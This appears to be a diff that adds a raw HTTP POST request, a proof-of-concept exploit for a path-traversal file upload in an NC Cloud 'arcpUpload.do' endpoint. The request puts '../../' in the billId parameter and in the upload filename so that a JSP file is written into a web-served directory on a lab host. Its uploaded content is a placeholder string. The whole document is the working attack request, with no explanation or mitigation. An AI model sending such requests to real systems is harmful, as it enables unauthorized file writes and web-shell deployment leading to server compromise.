@@ -1,0 +1,18 @@
+POST /nccloud/arcp/taskmonitor/arcpUpload.do?billId=../../ HTTP/1.1
+Host: 192.168.232.136:10888
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: SameSite=None; JSESSIONID=68F07887292F871614297DF28B48BCDA; nccloudsessionid=e8bc755396594a1d84945ae0e81007931697773666669; nccloudsessionid=e8bc755396594a1d84945ae0e81007931697773666669
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=---------------------------16233305153942
+Content-Length: 61905
+
+-----------------------------16233305153942
+Content-Disposition: form-data; name="file"; filename="../../hotwebs/uapws/test1.jsp"
+Content-Type: text/plain
+
+dasdasdasdadadadad
+-----------------------------16233305153942--
